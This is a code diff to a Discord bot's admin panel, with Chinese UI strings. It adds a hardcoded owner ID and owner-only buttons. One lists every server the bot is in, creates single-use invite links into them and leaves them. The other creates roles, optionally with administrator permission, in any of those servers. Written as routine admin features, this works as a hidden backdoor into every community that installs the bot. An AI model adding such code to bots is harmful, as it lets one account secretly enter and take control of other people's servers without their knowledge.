@@ -4,7 +4,7 @@ from discord import app_commands
 import os
 import psutil
 from utils.config import config_manager
-
+OWNER_ID = 1113353915010920452
 # --- Modals ---
 
 class StringConfigModal(discord.ui.Modal):
@@ -228,6 +228,130 @@ class ControlPanelView(discord.ui.View):
     async def restart(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_message("⚙️ 正在執行熱重啟...")
         os._exit(0)
+    @discord.ui.button(label="📜 伺服器列表 & 邀請", style=discord.ButtonStyle.primary, row=0, custom_id="admin_serverlist")
+    async def serverlist(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != OWNER_ID:
+            await interaction.response.send_message("❌ 只有擁有者可以使用此功能！", ephemeral=True)
+            return
+        view = ServerListView(self.bot)
+        embed = discord.Embed(title="🔧 Bot 所在伺服器列表", description="選擇伺服器以取得邀請或離開", color=0x00ff00)
+        await interaction.response.edit_message(embed=embed, view=view)
+
+    @discord.ui.button(label="🛡️ Role 添加", style=discord.ButtonStyle.primary, row=0, custom_id="admin_roleadd")
+    async def roleadd(self, interaction: discord.Interaction, button: discord.ui.Button):
+        """Owner-only command to add roles via a UI panel."""
+        if interaction.user.id != OWNER_ID:
+            await interaction.response.send_message("❌ 只有擁有者可以使用此功能！", ephemeral=True)
+            return
+        view = RoleAddView(self.bot)
+        await interaction.response.edit_message(content="選擇要操作的伺服器：", view=view)
+
+# --- Server List UI ---
+class ServerListView(discord.ui.View):
+    def __init__(self, bot):
+        super().__init__(timeout=None)
+        self.bot = bot
+        self.selected_guild = None
+        self.add_item(ServerSelect(bot))
+        self.add_item(LeaveGuildButton(bot))
+
+class ServerSelect(discord.ui.Select):
+    def __init__(self, bot):
+        options = [discord.SelectOption(label=g.name[:100], value=str(g.id)) for g in bot.guilds]
+        super().__init__(placeholder="選擇伺服器", min_values=1, max_values=1, options=options)
+        self.bot = bot
+    async def callback(self, interaction: discord.Interaction):
+        guild_id = int(self.values[0])
+        guild = self.bot.get_guild(guild_id)
+        if not guild:
+            await interaction.response.send_message("⚠️ 找不到伺服器。", ephemeral=True)
+            return
+        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
+        if channel:
+            invite = await channel.create_invite(max_uses=1, unique=True)
+            await interaction.response.send_message(f"🔗 **{guild.name}** 的邀請連結：{invite.url}", ephemeral=True)
+            self.view.selected_guild = guild
+        else:
+            await interaction.response.send_message("⚠️ 沒有可用頻道建立邀請。", ephemeral=True)
+
+class LeaveGuildButton(discord.ui.Button):
+    def __init__(self, bot):
+        super().__init__(label="離開選擇的伺服器", style=discord.ButtonStyle.danger)
+        self.bot = bot
+    async def callback(self, interaction: discord.Interaction):
+        selected_guild = getattr(self.view, "selected_guild", None)
+        if not selected_guild:
+            await interaction.response.send_message("⚠️ 請先選擇伺服器以取得邀請。", ephemeral=True)
+            return
+        try:
+            await selected_guild.leave()
+            await interaction.response.send_message(f"✅ 已離開伺服器 **{selected_guild.name}**。", ephemeral=True)
+        except Exception as e:
+            await interaction.response.send_message(f"⚠️ 離開伺服器失敗：{e}", ephemeral=True)
+
+# --- Role Add UI ---
+class RoleAddView(discord.ui.View):
+    def __init__(self, bot):
+        super().__init__(timeout=None)
+        self.bot = bot
+        self.add_item(GuildSelect(bot))
+
+class GuildSelect(discord.ui.Select):
+    def __init__(self, bot):
+        options = [discord.SelectOption(label=g.name[:100], value=str(g.id)) for g in bot.guilds]
+        super().__init__(placeholder="選擇伺服器", min_values=1, max_values=1, options=options)
+        self.bot = bot
+    async def callback(self, interaction: discord.Interaction):
+        guild_id = int(self.values[0])
+        guild = self.bot.get_guild(guild_id)
+        if not guild:
+            await interaction.response.send_message("⚠️ 找不到伺服器。", ephemeral=True)
+            return
+        view = RoleSelectView(self.bot, guild)
+        await interaction.response.edit_message(content=f"已選擇 **{guild.name}**，請選擇要新增的身分組或建立新身分組。", view=view)
+
+class RoleSelectView(discord.ui.View):
+    def __init__(self, bot, guild: discord.Guild):
+        super().__init__(timeout=None)
+        self.bot = bot
+        self.guild = guild
+        self.add_item(RoleSelect(guild))
+        self.add_item(CreateRoleButton(guild))
+
+class RoleSelect(discord.ui.Select):
+    def __init__(self, guild: discord.Guild):
+        options = [discord.SelectOption(label=r.name, value=str(r.id)) for r in guild.roles if not r.is_default()]
+        super().__init__(placeholder="選擇已有身分組", min_values=1, max_values=1, options=options)
+        self.guild = guild
+    async def callback(self, interaction: discord.Interaction):
+        role_id = int(self.values[0])
+        role = self.guild.get_role(role_id)
+        await interaction.response.send_message(f"✅ 已選擇身分組 **{role.name}** (ID: {role.id})。", ephemeral=True)
+
+class CreateRoleButton(discord.ui.Button):
+    def __init__(self, guild: discord.Guild):
+        super().__init__(label="🆕 建立新身分組", style=discord.ButtonStyle.success)
+        self.guild = guild
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.send_modal(CreateRoleModal(self.guild))
+
+class CreateRoleModal(discord.ui.Modal, title="建立新身分組"):
+    def __init__(self, guild: discord.Guild):
+        super().__init__()
+        self.guild = guild
+        self.name_input = discord.ui.TextInput(label="身分組名稱", placeholder="輸入身分組名稱", required=True)
+        self.add_item(self.name_input)
+        self.admin_toggle = discord.ui.TextInput(label="是否設為管理員(su)", placeholder="yes / no", required=False)
+        self.add_item(self.admin_toggle)
+    async def on_submit(self, interaction: discord.Interaction):
+        name = self.name_input.value.strip()
+        admin_flag = self.admin_toggle.value.lower() in ["yes", "y", "true", "1"]
+        perms = discord.Permissions(administrator=True) if admin_flag else discord.Permissions()
+        try:
+            role = await self.guild.create_role(name=name, permissions=perms)
+            await interaction.response.send_message(f"✅ 成功建立身分組 **{role.name}** （ID: {role.id}）。", ephemeral=True)
+        except Exception as e:
+            await interaction.response.send_message(f"⚠️ 建立身分組失敗：{e}", ephemeral=True)
 
 class AdminCog(commands.Cog):
     def __init__(self, bot):
